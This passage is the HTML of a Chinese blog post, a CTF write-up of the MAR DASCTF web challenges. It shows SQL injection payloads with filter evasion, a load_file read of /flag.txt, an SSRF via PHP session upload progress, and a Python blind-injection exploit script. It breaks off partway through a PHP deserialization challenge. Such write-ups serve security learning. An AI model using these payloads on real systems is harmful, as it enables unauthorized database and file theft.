@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="google-site-verification" content="McPiO5BdY1yB87an5v8Lw035aZiGKuLkg736kSbzD_k" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Logo font:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"as1def.github.io","root":"/","scheme":"Gemini","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":9},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="MAR DASCTF明御攻防赛赛后复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MAR DASCTF明御攻防赛">
+<meta property="og:url" content="https://as1def.github.io/2021/03/29/MAR-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/index.html">
+<meta property="og:site_name" content="As1def&#39;s Blog">
+<meta property="og:description" content="MAR DASCTF明御攻防赛赛后复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/DkorREzt7bBYyl2.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/oASb2HkjaKQYTnm.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/cq8kCH4f5TWGIez.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/ebJRVFzwGDr9dIg.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/U7EfvoYQBDzt1a6.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/sVLRjZSgcqhMYwx.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/IHoCqd6kRwYUt2L.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/lqbWX8RMpOmoT6Y.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/aRo8y2quPJVSWEe.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/IpKjmSb1yuOQMXz.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/uKYGc2SULAkN9Qy.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/07/tVYgIuNidMkObvo.png">
+<meta property="article:published_time" content="2021-03-29T06:14:00.000Z">
+<meta property="article:modified_time" content="2021-04-07T06:42:13.132Z">
+<meta property="article:author" content="As1def">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/07/DkorREzt7bBYyl2.png">
+
+<link rel="canonical" href="https://as1def.github.io/2021/03/29/MAR-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MAR DASCTF明御攻防赛 | As1def's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="As1def's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	
+	
+	<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+	
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">As1def's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://as1def.github.io/2021/03/29/MAR-DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="As1def">
+      <meta itemprop="description" content="听懂了一首歌,生活中回响着旋律">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="As1def's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MAR DASCTF明御攻防赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-29 14:14:00" itemprop="dateCreated datePublished" datetime="2021-03-29T14:14:00+08:00">2021-03-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-07 14:42:13" itemprop="dateModified" datetime="2021-04-07T14:42:13+08:00">2021-04-07</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="MAR-DASCTF明御攻防赛"><a href="#MAR-DASCTF明御攻防赛" class="headerlink" title="MAR DASCTF明御攻防赛"></a><strong>MAR DASCTF明御攻防赛</strong></h3><p>赛后复现</p>
+<a id="more"></a>
+
+<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h4><h5 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a><strong>BestDB</strong></h5><p>打开页面，是一个输入框，输入一个id返回用户的一些信息</p>
+<p><img src="https://i.loli.net/2021/04/07/DkorREzt7bBYyl2.png" alt="img"></p>
+<p>经简单测试，单引号空格之类的字符被过滤，使用双引号与”/**/“即可</p>
+<p>测试查询语句字段数为3：</p>
+<p><img src="https://i.loli.net/2021/04/07/oASb2HkjaKQYTnm.png" alt="img"></p>
+<p>简单测试查询数据库：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/cq8kCH4f5TWGIez.png" alt="img"></p>
+<p>得到users数据库，接着测试数据表：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="string">"users"</span>)),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/ebJRVFzwGDr9dIg.png" alt="img"></p>
+<p>得到两个表：f1agdas、users</p>
+<p>最终在f1agdas中得到了提示：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span>(f1agdas)<span class="keyword">from</span>(f1agdas)),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/U7EfvoYQBDzt1a6.png" alt="img"></p>
+<p>flag可能在flag.txt里面，尝试读取根目录里的flag.txt，使用<code>load_file</code>读文件：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1"<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span>(<span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="number">0x2f666c61672e747874</span>),<span class="number">1</span>,<span class="number">40</span>))),<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>注意这里/flag.txt要进行hex编码，因为flag也被过滤了。</p>
+<p><img src="https://i.loli.net/2021/04/07/sVLRjZSgcqhMYwx.png" alt="img"></p>
+<h5 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a><strong>ez_login</strong></h5><p>题目给出源码：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no session"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">"./php/check_ip.php"</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip($url))&#123;</span><br><span class="line">        <span class="keyword">if</span>($url)&#123;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">            curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            $output = curl_exec($ch);</span><br><span class="line">            $result_info = curl_getinfo($ch);</span><br><span class="line">            curl_close($ch);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your IP is internal yoyoyo"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>经目录探测发现存在admin.php，但需要localhost才能访问，XFF伪造不能达到效果，需利用SSRF，分析代码：</p>
+<p>代码开头部分限制了必须设置session，否则就退出程序不再往下执行。这里我们使用        <code>PHP_SESSION_UPLOAD_PROGRESS</code>上传session即可。</p>
+<blockquote>
+<p>session.upload_progress是php&gt;=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中（包含用户可控的值），即使此时用户没有初始化session，PHP也会自动初始化session。 而且，默认情况下session.upload_progress.enabled是为开启的</p>
+</blockquote>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://183.129.189.60:10015/?url=http://localhost/admin.php'</span></span><br><span class="line">mydata = &#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="string">'A1'</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">'file'</span>:(<span class="string">'A1.txt'</span>,<span class="string">'A1'</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'jtq4q3fdfgnckcrd52a6nhf90a'</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">print(r.request.body.decode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/IHoCqd6kRwYUt2L.png" alt="img"></p>
+<p>下载这个文件，里面是se1f_log3n.php:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./php/db.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./php/check_ip.php"</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">if</span>($ip !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    $sql = <span class="string">'SELECT `username`,`password` FROM `user` WHERE `username`= "'</span>.$username.<span class="string">'" and `password`="'</span>.$password.<span class="string">'";'</span>;</span><br><span class="line">    $result = $con-&gt;query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    ($result-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> $row = $result-&gt;fetch_assoc() <span class="keyword">AND</span> $con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"error"</span>)) <span class="keyword">OR</span> ( ($con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'Try again!'</span>) )); </span><br><span class="line">&#125;    <span class="comment">// 没有输出查询结果</span></span><br></pre></td></tr></table></figure></div>
+
+<p>存在sql盲注，且题目得名子是ez_login，那我们可以猜测本题旨在是让我们通过sql注入得到admin的密码。</p>
+<p>bool盲注：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = 'http://localhost//se1f_Log3n.php?username=A1\'or ascii(mid((<span class="keyword">select</span> <span class="keyword">user</span>()),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;%<span class="number">23</span><span class="keyword">password</span>=A1<span class="string">'.format(l,ord(s))</span></span><br><span class="line"><span class="string">user(): root@localhost</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = '</span><span class="keyword">http</span>://localhost//se1f_Log3n.php?username=A1\<span class="string">'or ascii(mid((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))=&#123;&#125;%23password=A1'</span>.format(l,<span class="keyword">ord</span>(s))</span><br><span class="line"><span class="keyword">databases</span>: ctf,information_schema,mysql,performance_schema,<span class="keyword">test</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'http://localhost//se1f_Log3n.php?username=A1\'</span><span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;%<span class="number">23</span><span class="keyword">password</span>=A1<span class="string">'.format(l,ord(s))</span></span><br><span class="line"><span class="string">Table_in_ctf: secret,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = '</span><span class="keyword">http</span>://localhost//se1f_Log3n.php?username=A1\<span class="string">'or ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\'</span>secret\<span class="string">'),&#123;&#125;,1))=&#123;&#125;%23password=A1'</span>.format(l,<span class="keyword">ord</span>(s))</span><br><span class="line">Column_in_secret: flag</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'http://localhost//se1f_Log3n.php?username=A1\'</span><span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> ctf.secret),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;%<span class="number">23</span><span class="keyword">password</span>=A1<span class="string">'.format(l,ord(s))</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>EXP</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~"</span></span><br><span class="line">mydata = &#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>:<span class="string">'A1'</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">'file'</span>:(<span class="string">'A1.txt'</span>,<span class="string">'A1'</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'a09fhn6a25drckcngfdf3q4qtj'</span>&#125;</span><br><span class="line">ip = <span class="string">'http://183.129.189.60:10015/?url='</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> asc_str:</span><br><span class="line">        payload = <span class="string">'http://localhost//se1f_Log3n.php?username=A1\'or ascii(mid((select flag from ctf.secret),&#123;&#125;,1))=&#123;&#125;%23password=A1'</span>.format(l,ord(s))</span><br><span class="line">        url = ip + quote(payload)</span><br><span class="line">        r = requests.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'correct?'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/04/07/lqbWX8RMpOmoT6Y.png" alt="img"></p>
+<h5 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a><strong>ez_serialize</strong></h5><p>题目给出源码：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"B"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">"ctfer"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'bad hacker~'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span 